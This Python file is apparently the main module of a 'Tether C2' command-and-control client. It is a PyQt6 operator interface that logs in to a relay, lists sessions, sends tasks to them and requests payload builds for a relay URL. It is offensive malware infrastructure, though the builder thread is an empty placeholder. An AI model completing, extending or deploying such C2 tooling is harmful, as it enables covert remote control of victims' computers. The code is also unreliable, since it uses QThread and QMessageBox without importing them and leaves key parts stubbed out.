# C2_Client/main.py
import sys
import psutil
import json
from PyQt6.QtWidgets import QApplication, QMainWindow, QStackedWidget, QStatusBar

# Import your custom modules
import updater
from ui.login_screen import LoginScreen
from ui.dashboard_window import DashboardWindow
from ui.session_view import SessionView
from builder import build_payload
from config import RELAY_URL_FORMAT
from themes import ThemeManager
from api_client import ApiClient

class LocalSettingsManager:
    """Manages local client settings like the selected theme."""
    def __init__(self, db_file="tether_client_settings.db"):
        import sqlite3
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.conn.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    def save_setting(self, key, value):
        self.conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, json.dumps(value)))
        self.conn.commit()
    def load_setting(self, key, default=None):
        cursor = self.conn.execute("SELECT value FROM settings WHERE key = ?", (key,))
        result = cursor.fetchone()
        return json.loads(result[0]) if result else default

class BuildThread(QThread):
    """Handles the payload building process in a separate thread to keep the UI responsive."""
    # (This is a placeholder for your detailed BuildThread code)
    pass 

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"Tether C2 v{updater.get_current_version()}")
        self.setGeometry(100, 100, 1600, 900)
        self.db = LocalSettingsManager()
        self.api = ApiClient(self)
        self.current_user = None
        self.theme_manager = ThemeManager()
        self.setStatusBar(QStatusBar(self))
        
        self.stack = QStackedWidget()
        self.setCentralWidget(self.stack)

        self.login_screen = LoginScreen(self.api)
        self.stack.addWidget(self.login_screen)
        
        self.dashboard_view = None
        self.session_view = None

        self.login_screen.login_successful.connect(self.show_dashboard_view)
        
        # Load and apply the saved theme on startup
        saved_theme = self.db.load_setting("theme", "Dark (Default)")
        self.apply_theme(saved_theme)

    def apply_theme(self, theme_name):
        stylesheet = self.theme_manager.get_stylesheet(theme_name)
        self.setStyleSheet(stylesheet)
        # Ensure theme is reapplied if child widgets already exist
        if self.dashboard_view: self.dashboard_view.setStyleSheet(stylesheet)
        if self.session_view: self.session_view.setStyleSheet(stylesheet)

    def show_dashboard_view(self, username, assigned_line):
        self.current_user = username
        # This is the crucial step to set the communication line for the entire session
        self.api.set_line(assigned_line)
        
        self.dashboard_view = DashboardWindow(self.api, self.db, self.current_user)
        self.session_view = SessionView(self.db)
        
        self.stack.addWidget(self.dashboard_view)
        self.stack.addWidget(self.session_view)

        # Connect signals from the new dashboard and session views
        self.dashboard_view.sign_out_requested.connect(self.handle_sign_out)
        self.dashboard_view.setting_changed.connect(self.handle_setting_changed)
        self.dashboard_view.build_requested.connect(self.start_build)
        self.dashboard_view.session_interact_requested.connect(self.open_session_view)
        self.session_view.back_requested.connect(lambda: self.stack.setCurrentWidget(self.dashboard_view))
        self.session_view.task_requested.connect(self.dashboard_view.send_task_from_session)
        self.dashboard_view.data_updated_for_session.connect(self.session_view.handle_command_response)

        self.stack.setCurrentWidget(self.dashboard_view)
        self.statusBar().showMessage(f"Logged in as {username}. Using Line #{assigned_line}", 4000)

    def open_session_view(self, session_id, session_data):
        self.session_view.load_session(session_id, session_data)
        self.stack.setCurrentWidget(self.session_view)
        
    def handle_setting_changed(self, key, value):
        self.db.save_setting(key, value)
        if key == "theme": self.apply_theme(value)

    def start_build(self, settings):
        # This now uses the pre-set base_url from the API client
        relay_url_for_build = self.api.base_url
        if not relay_url_for_build:
            QMessageBox.critical(self, "Build Error", "Cannot build payload, API client line not set.")
            return

        self.dashboard_view.builder_pane.show_build_log_pane()
        self.dashboard_view.builder_pane.build_button.setEnabled(False)
        
        # This needs your full BuildThread implementation to work
        # self.build_thread = BuildThread(settings, relay_url_for_build, self.current_user)
        # ... connect signals and start ...
        print(f"Build requested with settings for URL: {relay_url_for_build}")


    def handle_sign_out(self):
        if self.dashboard_view:
            self.dashboard_view.stop_polling()
            self.stack.removeWidget(self.dashboard_view); self.dashboard_view.deleteLater(); self.dashboard_view = None
        if self.session_view:
            self.stack.removeWidget(self.session_view); self.session_view.deleteLater(); self.session_view = None
        self.current_user = None
        # Reset the API client so it forgets the assigned line
        self.api.base_url = None
        self.api.line_number = None
        self.stack.setCurrentWidget(self.login_screen)
        self.statusBar().showMessage("Signed out.", 3000)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    
    # --- UPDATE CHECK ON STARTUP ---
    # This runs before the main window is created.
    if updater.check_for_updates():
        # If an update is downloaded, the updater returns True.
        # We exit here because the update script will restart the application.
        sys.exit(0)
    
    window = MainWindow()
    window.show()
    sys.exit(app.exec())